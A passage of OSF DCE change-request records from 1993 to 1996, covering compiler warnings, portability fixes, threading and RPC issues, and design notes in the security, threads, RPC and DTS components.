and by prototype  security/krb5/comerr/com_err.h as

	extern char const *error_message (long);

the include of com_err.h has been commented out of com_err.c,
causing the definition of error_message to default to

	int error_message();

The result being that at compile time we get the warning

../../../../../../src/security/krb5/comerr/com_err.c:108: warning: argument
passing of pointer from integer lacks a cast

Proposed Solution:

	reinstate definition of error_message() in com_err.c either
        by uncommented include of com)_err.h, or by an adding a new
        definition.



CR Number                     : 8315
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : sec
Subcomponent Name             : krb5/lib/os/read_pwd.c
Short Description             : There is a missing type cast
in the file read_pwd.c which causes a warning when the file is compiled
Reported Date                 : 7/19/93
Found in Baseline             : 1.0.2
Found Date                    : 7/19/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[7/19/93 public]

     The line:

     if ( (ointrfunc = sigset(SIGINT, intr_routine)) == SIG_ERR )
               SHOULD BE REPLACED WITH
     if ( (ointrfunc = sigset(SIGINT, (void (*)())intr_routine)) == SIG_ERR )

     at line 194.

[07/20/93 public]
NO!  Fix intr_routine so that it is defined properly to be an ANSI/Posix
style signal handler, not a V7 Unix signal handler.

Don't cast, fix the code.

[07/20/93 public]
Added myself to interest list.

[8/2/93 public]

Fixed as part of code cleanup for 1.1.  Changed to enhancement until
1.0.3 ships.



CR Number                     : 8314
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : remove unreachable abort() statements
Reported Date                 : 7/19/93
Found in Baseline             : 1.0.2
Found Date                    : 7/19/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/utils/sec_authn.c
Sensitivity                   : public

[7/19/93 public]

in sec/utils/sec_auth.c there are two places where abort() is called at the
end of a function. With each of these calls, there is a comment which
indicates that it was the developer's intention to design the function
such that it would only return by one of the flows enumerated in the body
of the function, and that the abort statement was included to detect and
extinguish unanticipated flows which would result in a return from the
function at its closing brace.

An interesting characteristic of this strategy is that, given a
finicky enough compiler, you get a complaint when the function is written
as designed, and the complaint goes away when an erroneous change to the
function causes the abort message to become reachable. It seams to me that
it would be easy to refute this coding practice if there was a way (using
C) to turn the equation around, such that the compiler is silent as long as
the function is guaranteed to return by one of the implemented return
statements, and you get a warning or error when it is it is possible to
drop out at the bottom.

Proposed Solution:

    remove abort statements from end of functions:

        sec_krb_dg_build_message
        sec_krb_cn_build_message

[7/19/93]

The "abort()" calls can go.

If the functions are not void (and I think they aren't; I don't have
time at this moment to check), a good compiler will warn if you can
"fall off the end" and not return a value.

					- Bill



CR Number                     : 8311
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : krb5/lib/mvr/krb5-manual-glue.c
Short Description             : There are several missing type
casts which cause warnings when the file is compiled
Reported Date                 : 7/19/93
Found in Baseline             : 1.0.2
Found Date                    : 7/19/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[7/19/93 public]

Full Description: (NOTE: Line numbers are only approximate due to source
     control headers)

     The line:

     m->v = asn1_malloc (4);
          SHOULD BE REPLACED WITH
     m->v = (asn1)asn1_malloc (4);

     at line 120.

     The line:

     m->v = asn1_malloc (len?len:1);
          SHOULD BE REPLACED WITH
     m->v = (asn1)asn1_malloc (len?len:1);

     at lines 141 and 161.

     The line:

     m->v = asn1_malloc (20);
          SHOULD BE REPLACED WITH
     m->v = (asn1)asn1_malloc (20);

     at line 176.

[8/2/93 public]

Fixed as part of code cleanup for 1.1.  Changed to enhancement until
1.0.3 ships.



CR Number                     : 8308
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : compiler warnings
Reported Date                 : 7/19/93
Found in Baseline             : 1.0.2
Found Date                    : 7/19/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/utils/sec_id_pac_util.c
Sensitivity                   : public

[7/19/93 public]

In function sec_id_pac_util_free chnage the decalaration of i as follows:

	change: int i;

	to:	unsigned16 i;

This change will elimate compiler warnings resulting form the
compilation of the following lines:

line 80:	for (i = 0; i < p->num_groups; i++) {
line 92:	for (i = 0; i < p->num_foreign_groups; i++) {

[7/19/93 public]

If at all possible, use just "unsigned". instead of "unsigned16".  This
will make for less size-specific code (should we choose to widen the
num_groups/num_foreign_groups fields in the future).



CR Number                     : 8307
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : i486
S/W Ref Platform              : osf1
Component Name                : sec
Subcomponent Name             : 
Short Description             : warning: return between incompatible pointer types
Reported Date                 : 7/19/93
Found in Baseline             : 1.0.2
Found Date                    : 7/19/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/utils/crypt.c
Sensitivity                   : public

[7/19/93 public]

function sec_crypt_create_context is defined to return type
sec_crypt_handle_t, but returned value is type sec_crypt_context_t.
This results in compiler warning 

../../../../src/security/utils/crypt.c:244: warning: return between
incompatible pointer types

Alternative Solutions:
	
	a. cast value before return to type sec_crypt_handle_t

	b. security/h/crypt.h defines sec_crypt_handle_t as

		typedef  Pointer  sec_crypt_handle_t;

	   security/h/Pointer.h	defines Pointer as

           #   if !defined(apollo) || defined(CHARPTR)
                   typedef char * Pointer;
           #   else
                   typedef void * Pointer;
           #   endif

	   which appears to define the Pointer type for the purpose
	   of holding an opaque pointer to any datatype.

	   Note that this capability has only been enabled for
           compilation environments which define apollo and don't
           define CHARPTR. I suggest that we expand the situations
           where Pointer is typedefed to be a void *, such that it
           includes other compilation environments most notably,
           OSF1/i486 (I suspect we must be careful not to include
           environments where pointesr are of different sizes).



CR Number                     : 8302
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : deletion of principals needs work
Reported Date                 : 7/16/93
Found in Baseline             : 1.0.2
Found Date                    : 7/16/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[7/16/93 public]

Our handling of the deletion of principals is suboptimal.

Because of the caching of tickets in login contexts, we shouldn't delete
and then recreate a principal name in a time interval less than the maximum
ticket lifetime.

We could implement this by leaving the old name around pointing at a
"zombie" principal until the lifetime has run out.  If you attempt to
re-create a principal inside that lifetime, either
	a) you get an error and it refuses to let you do this
or
	b) you start with a key version number other than the default
initial value.

This would give you a distinct error message indicating that you used the
wrong version if you re-use a stale ticket talking to a new server.

We could then handle that error by nuking that ticket out of the credential
cache, fetching a new one, and trying again.

there would need to be a limit on the number of iterations you try on that,
lest you wind up in an infinite loop fetching the same ticket over & over
again..

This is too much of a change for 1.0.3; marked "fix in 1.1".



CR Number                     : 8300
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 1694
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : 
Short Description             : add include of stdlib.h to cma.h
Reported Date                 : 7/16/93
Found in Baseline             : 1.0.2
Found Date                    : 7/16/93
Severity                      : E
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : cma.h
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[7/16/93 public]

Customer is trying to build DCE using OSF1 kernel threads which means that
whereever they include cma.h it doesn't proceed to include cmalib_crtlx.h
and accordingly cmalib_crtlx.h doesn't have an opportunity to include
stdlib.h. The result being that functions like malloc are threated as
returning int instead of void *, and compiler warnings are produced 
whenever the returned value of malloc is not cast before being assigned
to other than an integer.

I suggest we make inclusion of stdlib.h an invariant consequence of
including cma.h, the result being that one can be certain that as a
result of including cma.h the function definitions of stdlib.h or their
mapped equivalents have been performed.

Doing as suggested is facilitated since stdlib.h has been written to
prevent its being multiply included.



CR Number                     : 8299
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : bld
Subcomponent Name             : 
Short Description             : remove references to -DAIX32
Reported Date                 : 7/16/93
Found in Baseline             : 1.0.3
Found Date                    : 7/16/93
Severity                      : E
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : see list
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[7/16/93 public]
The compilation conditional AIX32 has existed since we upgraded the RIOSes
to AIX3.2.  It was designed to allow backwards compatiblity for the 1.0.1
release.  We've moved beyond that now so we no longer need it.

The conditionals should be removed and the code provided for the case in
which AIX32 is true should be made the default.

Here are the affected files:
./directory/cds/adver/adver_sysdep_unix.c
./directory/cds/cdsbrowser/cds_browsersource.c
./directory/cds/server/event_lib.c
./diskless/boot/bootpd/bootpd.c
./file/RIOS/machdep.mk
./file/bakutil/Makefile
./file/bakutil/budb_test.c
./file/cm/cm_subr.c
./file/config/RIOS/param.h
./file/episode/vnops/efs_vnodeops.c
./file/osi/RIOS/osi_cred_mach.h
./file/osi/osi_cred.h
./file/xvnode/RIOS/xvfs_vfs2aix.c
./lbe/mk/osf.dce.mk
./rpc/idl/idl_compiler/message.c
./rpc/kruntime/RIOS/comsoc_sys.c
./rpc/kruntime/RIOS/ipnaf_sys.c
./rpc/runtime/RIOS/comsoc_sys.h
./rpc/runtime/RIOS/ipnaf_sys.c
./rpc/runtime/RIOS/sysconf.h
./rpc/runtime/comnaf.c
./rpc/runtime/dce_error.c
./threads/cma_message.c

[6/28/94 public]
This should be cleaned up by 1.1.

[7/1/94 public]
reassigned to Annie

[7/12/94 public]
After looking at the code a bit, I think the fix for this is not as 
straightforward as Rich had implied.  The conditional
"#ifdef AIX32"     and
"#ifdef AFS_AIX32_ENV"

not only differentiates between revisions of the AIX operating systen, but,
from other  platforms as well.  Should code that is currently AIX specific
be suddenly included on HP or 486?  Removing these ifdefs will cause
other platforms to use the code enclosed in the "#ifdef AIX32".  Currently,
the other platforms don't use this code.

Am I missing something?  It seems as though we are going to need an 
"#ifdef AIX32" of some kind in the code.  

Also,  most of the files listed do not have "#ifdef AIX32".  Rather, they
have comments about the AIX32 upgrade.

[zeliff 7/12/94 public] 

Your point about the removing the code is well taken.  You should probably
change AIX32 to _AIX (which is the correct means of identifying
machine-dependent source code -- see RFC34.2 for details) and remove the
AIX3.1.5 code.

Also, the list of files is out of date.  The defect was opened a year ago
(i.e., four DCE releases ago) and the source code has changed quite a bit.
However, there are still occurances in some of the code.

[08/26/96 public]

Unless this really needs to be addressed for 1.2.2, I'd like to defer this.
Since there is no fixby entry that I can enter for a real defer, I am
simply removing the fixby entry.



CR Number                     : 8278
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : i486
S/W Ref Platform              : osf1
Component Name                : sec
Subcomponent Name             : 
Short Description             : security/server/bin/Makefile redefines BSD
Reported Date                 : 7/15/93
Found in Baseline             : 1.0.2
Found Date                    : 7/15/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/server/bin/Makefile
Sensitivity                   : public

[7/15/93 public]

section 3.8.3 Macro Replacement of the ANSI C specification (X3.159-1989),
clause 10, states basically that an identifier defined using define can
only be redefined in a second define statement if the definitions are
identical. Otherwise, it is a compilation error.

The security/server/bin/Makefile redefines BSD using the -DBSD mechanism
this redefinition is incosistent with the definition of BSD present in
sys/param.h (#define BSD     198911)

Our builds at OSF only produce a warning, which is lucky for us, but we
should have expected to pay more dearly if our compiler followed the
spec. There is some question about whether or not this define should occur
in the sys/param.h file, or in other words, whether it is really OSF1
which should be fixed.

/u1/skel/dce/export/pmax/usr/include/sys/param.h:374: warning: BSD

Proposed Solution:

Add the -DBSD to the RIOS_CFLAGS and remove it from the the CFLAGS
definition. That is, if there is any reason the RIOS build depends
on BSD.



CR Number                     : 8267
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 8104
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : osf1
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : RPC CN code doesn't support fork handlers.
Reported Date                 : 7/13/93
Found in Baseline             : 1.0.2
Found Date                    : 7/13/93
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[7/13/93 public]

OT 8103 notes that fork handers are not enabled in the DG code. It says that
it will open another defect on fork handeres in the CN code, but I couldn't
find one. In any case, The CN code as shipped by OSF will not support fork
handers. This means that applications which 'fork' will not work in an RPC enviroment. This should be fixed.

[7/14/93 public]

OT 8104 was intended for it. The above sentence should be "applications,
which 'fork' and not immediately exec in a child, will not work in an RPC
enviroment."



CR Number                     : 8256
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : des
Short Description             : des_ecb_buffer not used
Reported Date                 : 7/12/93
Found in Baseline             : 1.0.2a
Found Date                    : 7/12/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/krb5/lib/crypto/*/ecb_buffer.c
Sensitivity                   : public

[7/12/93 public]

As far as I can tell (via a "grep" over the 1.0.2a source tree),
des_ecb_buffer is not used anywhere in the DCE source tree.

In any event, encrypting byte streams in ECB mode is not recommended, as it
turns the cipher into a 64-bit simple substitution cypher.. patterns in the
underlying plaintext with 8-byte alignment show up as similar patterns in
the cyphertext.  It would really be bad for, encrypting RISC object code,
where the underlying symbols are typically 4-byte aligned anyway..

It should be flushed from the source tree.



CR Number                     : 8239
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : 
Short Description             : cma_recvmsg does not return valid access rights
Reported Date                 : 7/7/93
Found in Baseline             : 1.0.2a
Found Date                    : 7/7/93
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : 
Transarc Status               : 

[7/7/93 public]
    [Opening this defect for Andy Hastings]
cma_recvmsg does not return valid access rights.
Scenario:  Process A passes a file descriptor to process B via sendmsg/recvmsg
           calls on a Unix-domain socket.
1.  Process B stores the appropriate values in msg_accrightslen and
    msg_accrights.  Process B makes the recvmsg call BEFORE data is
    available on the socket.  Process A then makes the appropriate sendmsg
    call.  Result:  the msg_accrightslen returned to process B is ZERO,
    and no file descriptors are returned.  Fix:  cma_recvmsg should save
    the initial value of msg_accrightslen, and restore the value before
    each recvmsg system call.
2.  Process B makes the recvmsg call AFTER data is available on the socket.
    Process B receives the file descriptor, but the CMA I/O database does
    not know about it, and all attempts to perform I/O on the descriptor
    fail with EBADF.  Fix:  cma_recvmsg should call cma__open_general on
    each file descriptor received via the recvmsg system call.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `' 
Added field Transarc Status with value `'



CR Number                     : 8216
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : sec
Subcomponent Name             : sec_admin
Short Description             : C shorthand foils printf on SunOS
Reported Date                 : 6/30/93
Found in Baseline             : 1.0.2
Found Date                    : 6/30/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : client/admin/sec_admin/sa_util.c,sa_replist.c
Sensitivity                   : public

[6/30/93 public]
I've been seeing the following in sec_admin info, monitor, and lrep
output for a few months on Suns and not realizing that it was in error:
sec_admin> info
Default replica:  /.../rainier.dce.transarc.com/subsys/dce/sec/master
Default cell:     /.../rainier.dce.transarc.com
          State:                    - master
          Last update received at: Wed Jun 30 10:33:11 1993
          Last update's seqno:     0.43520
Note the blank before the dash in the 'State:' line. The code lines
causing this are printf()'s that expect the following argument to fill a
%s format: 
		rgy_state[infoP->rep_state]
rgy_state is an array of structures, each having one field, a char
pointer. I haven't the time to figure out why, but the SunOS 4 and the
Solaris 2.* C compiler does not complain about this, yet does *not*
issue code that passes the contents of that singular field to printf() .
What results - every time - is a single space being printed for that %s .
Changing the references to the above structure to the following fixes
the problem and places this argument into strict(er) C syntax:
		rgy_state[infoP->rep_state].state
Changing this twice on about lines 566 and 569 - in routine
sa_print_site_info() - causes the above missing field to show up every
time.
Also found along the way for this was that, in sa_replist.c, there is an
unused, similar structure array called "rep_state" which is not
referenced (at least, as far as 'grep' reveals) anywhere; maybe this was
superceded by 'rgy_state'?

[7/9/93 public]
  There's also one other instance of this: a use of array
'prop_type_text' at about line 350 or so of sa_replist.c .
It too was found to need '.state' appended to the reference
in order to solve the same problem
Changed Affected File from `client/admin/sec_admin/sa_util.c' to 
 `client/admin/sec_admin/sa_util.c,sa_replist.c'

[8/2/93 public]

SunOS only problem.  Changed to enhancement.



CR Number                     : 8177
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : krb5_read_password
Short Description             : krb5_read_password not even close to thread-safe if interrupted.
Reported Date                 : 6/18/93
Found in Baseline             : 1.0
Found Date                    : 6/18/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
	security/krb5/lib/os/read_pwd.c
Sensitivity                   : public

[6/18/93 public]

krb5_read_password isn't even *close* to thread safe (it does a longjmp
from a signal handler to deal with an interrupted read.  Just plain bad
news...).

It's not at all clear what the correct fix is..



CR Number                     : 8170
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : definition of GOOD_STATUS STATUS_OK
Reported Date                 : 6/17/93
Found in Baseline             : 1.0.2
Found Date                    : 6/17/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/h/macros.h and others
Sensitivity                   : public

[6/17/93 public]

 The macros:

 #define STATUS_OK(stp)   ((stp)==NULL || (*stp) == error_status_ok)
 #define GOOD_STATUS(stp) ((stp)==NULL || (*stp) == error_status_ok)

 Looks wrong. If some function call sets the status (stp) to NULL then this
 GOOD_STATUS(stp) will return true incorrectly.  Shouldn't it be:

 #define GOOD_STATUS(stp) ((stp)!=NULL && (*stp) == error_status_ok)

 implying that NULL stp is also incorrect.

 This argument is backed by the definition and typical use of the following
 macro:

 #define SET_STATUS(stp, val)      (*stp) = val

 And you will see many places in DCE code the following logic:

 if (GOOD_STATUS(st)) {
 ...
   SET_STATUS(st, xxx_s_xxx);
 ...
 }

 What would you expect if 'st' is NULL? GOOD_STATUS will allow it and
 SET_STATUS would core dump it!!!

Repeat By:

        N/A

Proposed Solution:

        Change the definition of GOOD_STATUS(stp) and STATUS_OK(stp)
        (at many places in DCE code) to the following:

 #define GOOD_STATUS(stp) ((stp)!=NULL && (*stp) == error_status_ok)

        Or on the contrary you want to change SET_STATUS(stp, val) to:

#define SET_STATUS(stp, val)      (stp? (*stp) = val : ;)

        This won't solve all the problems because there are many instances of
        '*stp = val' that does not check for stp != NULL.

[06/17/93 public]
I believe that passing in a NULL pointer for a status parameter is generally
not supported and that it is therefore okay for SET_STATUS to not check
for a NULL pointer.  I would like to see either GOOD_STATUS or STATUS_OK
go away -- why have two ways of saying the same thing?  I am not sure
about the first comment here; perhaps the "stp == NULL" test should just
be removed altogether.

[6/17/93 public]

What he said.

The test against NULL is bogus and stands only as an invitation for certain
code-coverage tools to generate deflated test coverage metrics.

The MMU is in your systems for a reason; let *it* detect the store through
a null pointer.

[8/2/93 public]

Fixed as part of code cleanup in 1.1.  Changed to enhancement until
1.0.3 ships.



CR Number                     : 8158
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : thr
Subcomponent Name             : 
Short Description             : Turn off compiler optimization
on HP/UX
Reported Date                 : 6/15/93
Found in Baseline             : 1.0.3
Found Date                    : 6/15/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : threads/exc_handling.h
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[6/15/93 public]
Currently the HP/UX port of DCE has compilation problems when compiler
optimization is turned on.  The version of the compiler being used is:

# what /lib/ccom
/lib/ccom:
        HP92453-01 A.09.19 HP C Compiler
         HP-UX SLLIC/OPTIMIZER  HP-UX.09.00.20 08/13/92
         Ucode Code Generator - HP-UX.09.00.23 8/13/92

Folks at HP suggest that an interim fix is to add the following code to
threads/exc_handling.h:

	#ifdef __hpux
	#pragma OPTIMIZE OFF
	#endif



CR Number                     : 8148
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : thr
Subcomponent Name             : HPUX: cma_fcntl error when called with (setfl, O_NDELAY)
Short Description             : cma_fcntl fails when trying to set O_NDELAY
Reported Date                 : 6/11/93
Found in Baseline             : 1.0.3
Found Date                    : 6/11/93
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : cma_thdio_3.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[6/11/93 public]

NB: This bug is against the 1.0.3 hpux port.
============================================

In rpc/runtime/comsoc_bsd.c/rpc__socket_set_nbio(), there's a call:

   i = fcntl(sock, F_SETFL, O_NDELAY);

This goes into cma_fcntl which does:

	#ifdef __hpux
		tmp_arg |= O_NONBLOCK;

This causes the real fcntl to return EINVAL.  The hpux man page for fcntl
says: 

           [EINVAL]       cmd is F_SETFL and both O_NONBLOCK and O_NDELAY 
                          are specified. 
 
It's not yet clear if this is causing serious problems, but it should be
fixed.  During the port to OSF/1, there were similar issues with one of the
bits being set for the fd, but the other bit being tested later...

[9/23/93 public]

I have two major topics to discuss with respect to this bug: 1) a
question about how the DG RPC runtime can possibly work with this bug;
2) the proposed fix and its ramifications.

1) It is NOT obvious that the DG runtime currently works properly here
for the HP port. The call to fcntl is in rpc__socket_set_nbio, which 
I've copied below. After that, I copied the line where it's called, in
use_protseq(), in rpc/runtime/dgsoc.c. I assume the filer of this
report must have been running RPC in debug mode to see this error, as
the caller does not check the return value from
rpc__socket_set_nbio(). On HP/UX, this call to fcntl() will fail, and 
the flags will remain unchanged. Unless the caller calls fcntl with 
O_NONBLOCK or uses the FIOSNBIO ioctl() request, any subsequent 
recvfrom() attempts on the socket will block (from RPC's perspective) 
if there is no data present.

My question is, does the runtime care if this call fails? If so, the
observable effects should be added to this report and fixed by the DG 
RPC responsible engineer. If not, this bug should be cancelled.

PRIVATE rpc_socket_error_t rpc__socket_set_nbio(sock)

rpc_socket_t        sock;

{
#ifndef vms

    int i;

    i = fcntl(sock, F_SETFL, O_NDELAY);
    if (i == -1)
    {
        RPC_DBG_GPRINTF(("(rpc__socket_set_nbio) error=%d\n", errno));
        return (errno);
    }

    return (rpc_c_socket_ok);

#else
VMS code removed
#endif
}

from rpc/runtime/dgsoc.c:
    /*
     * Set the socket to do non-blocking IO, and to close itself
     * if the process execs.
     */
    rpc__socket_set_nbio(socket_desc);
    rpc__socket_set_close_on_exec(socket_desc);


2) a) We could "fix" this bug by having the threads component mask out
O_NDELAY when it is requested (for __hpux). But this would change the
behavior of the recv* and read system calls. Instead, it should/will
be documented that DCE threads use O_NONBLOCK internally, and that
using O_NDELAY may produce unexpected results on some (HPUX)
platforms.  DCE threads applications (such as DCE RPC) should use
O_NONBLOCK to get non-blocking behavior.

   b) Using O_NONBLOCK in rpc/rpc/runtime/comsoc_bsd.c instead of
O_NDELAY will raise questions about the expected recvfrom/recv/read
semantics in the RPC runtime.  When O_NDELAY is set, recvfrom()
returns zero when there is no data on the socket. If the call to fcntl
is made with O_NONBLOCK, as suggested, a read on a socket with no data
will return (-1). The RPC runtime macros can not handle this, because
they compare the return value to rpc_c_socket_ok, which is defined as
0 (zero). For this change to work, the macros in comsoc*.h will need
to be reviewed and fixed. This looks like a DCE 1.1 change.

  c) O_NDELAY appears in the DCE sources as follows (occurances in
threads are not included). A quick look at the files suggests that
rpc, directory/gds, security, and time may require attention.

#define O_NONBLOCK      O_NDELAY
./directory/gds/oss/prod/cmxxtiport.h
        if (fcntl(fd, F_SETFL, status|O_NDELAY) == D2_ERROR)
./directory/gds/util/d27rdchk.c
                    O_NDELAY|O_WRONLY|O_NOCTTY, 0777, 0, FP_SYS, &fd);
./file/osi/RIOS/osi_port_aix.c
#define O_NDELAY    0
./nosupport/glb/glbd/std.h
    *---* first try to open the file.  We specify O_NONBLOCK and O_NDELAY
to
   if ( (fd = open_file(fn, O_RDONLY | O_NONBLOCK | O_NDELAY, 0)) == -1 )
./nosupport/test/systest/1.0.2systest/file/filewnr.c
    i = fcntl(sock, F_SETFL, O_NDELAY);
./rpc/runtime/RIOS/comsoc_sys.c
    i = fcntl(sock, F_SETFL, O_NDELAY);
./rpc/runtime/SVR4/comsoc_sys.c
 * (see BSD UNIX fcntl(sock, F_SETFL, O_NDELAY))
./rpc/runtime/comsoc.h
    i = fcntl(sock, F_SETFL, O_NDELAY);
./rpc/runtime/comsoc_bsd.c
#  define set_socket_non_blocking(sock) fcntl(sock, F_SETFL, O_NDELAY)
./rpc/runtime/std_15.h
                *fd = open(LRGY_FILE, (O_RDWR | O_CREAT | O_NDELAY |
O_EXCL),
            *nfd = open(LRGY_NEW_FILE, (O_RDWR | O_CREAT | O_NDELAY |
O_EXCL), 0);
                            (O_RDWR | O_CREAT | O_NDELAY | O_EXCL),
            *nfd = open(LRGY_NEW_TGT_FILE, (O_RDWR | O_CREAT | O_NDELAY |
O_EXCL), 0);
./security/client/rca/sec_lrgy.c
    {"O_NDELAY",   O_NDELAY},
./test/file/itl/file/itl_file.c
    *---* first try to open the file.  We specify O_NONBLOCK and O_NDELAY
to
   if ( (fd = open_file(fn, O_RDONLY | O_NONBLOCK | O_NDELAY, 0)) == -1 )
./test/systest/file/filewnr.c
        if ((ttyfd = open("/dev/tty", O_RDONLY | O_NDELAY)) >= 0) {
./test/tet/src/dtet/dtetlib/notty.c
    if ((fd = open(devicename, O_RDWR  | O_NDELAY, 0)) < 0)
./time/service/dts_acts_provider.c

[9/23/93 public]

I forgot to mention that the use of O_NDELAY is not defined by POSIX; but 
O_NONBLOCK is the POSIX way of doing non-blocking I/O.

[9/24/93 public]

Under the right (and not that unlikely) circumstances, this bug could end up 
disabling a DCE application/service.

I expect that as part of the 1.1 code cleanup work, RPC and the other components
will be modified to use O_NONBLOCK (for POSIX conformance).  In the meantime,
it seems like the right thing to do is to fix the CMA library to handle
requests for NDELAY semantics correctly.

[10/15/93 public]
This is realy an enhancement request related to code cleanup and will be 
addresses then.



CR Number                     : 8146
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : dts
Subcomponent Name             : 
Short Description             : dtsd error messages
Reported Date                 : 6/11/93
Found in Baseline             : 1.0.2
Found Date                    : 6/11/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[6/11/93 public]

I think the following reported problem falls into the 1.1 servicability
issue of better error messages"

"It appears that the error messages from dtsd are inconsistent.

If DTSd (1.0.2 version) is started by a user who is not UNIX root, 
the message "No current network identity......" is displayed. 

This does not describe the "root" cause of the problem.

It is true that DTS will fail for all but root users because 
1.0.2 DTS removes the callers context, so the machine identity
is used for the root user, and no identity for a non root user, 
but maybe the error message should be more explicit.

The immediate response to the above error message is to do a dce_login
which is not the correct response.

All the other DCE daemons return a "not priviledged user" type error
message, is it possible to do the same for DTS?"



CR Number                     : 8131
Defect or Enhancement?        : enh
